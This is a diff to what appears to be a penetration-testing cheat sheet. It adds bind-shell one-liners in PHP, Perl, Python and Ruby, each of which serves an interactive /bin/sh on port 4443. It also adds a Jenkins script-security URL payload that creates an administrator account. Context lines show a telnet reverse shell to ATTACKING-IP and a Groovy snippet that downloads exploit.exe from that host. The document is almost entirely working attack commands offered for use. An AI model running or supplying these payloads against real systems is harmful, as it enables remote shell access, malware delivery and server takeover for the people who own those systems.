@@ -87,6 +87,22 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 
 ---------------------------------------------------------------------------------------------------------------------------------------
 
+# Bind Shells:
+
+PHP Linux:
+php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4443);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
+
+Perl Linux:
+perl -e 'use Socket;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'
+
+Python Linux:
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',4443));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"
+
+Ruby Linux:
+ruby -rsocket -e 'f=TCPServer.new(4443);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
 # Jenkins - Groovy Script:
 
 Extract Credentials:
@@ -100,6 +116,9 @@ Remote File Download:
 def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
 (or)
 def url = 'file://ATTACKING-IP//public//exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
+
+Create Admin Account:
+http://localhost:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/?sandbox=True&value=import+jenkins.model.*%0aimport+hudson.security.*%0aclass+nice{nice(){def+instance=Jenkins.getInstance();def+hudsonRealm=new+HudsonPrivateSecurityRealm(false);hudsonRealm.createAccount("<username>","<password>");instance.setSecurityRealm(hudsonRealm);instance.save();def+strategy=new+GlobalMatrixAuthorizationStrategy();%0astrategy.add(Jenkins.ADMINISTER,'<username>');instance.setAuthorizationStrategy(strategy)}}
 
 ---------------------------------------------------------------------------------------------------------------------------------------
 
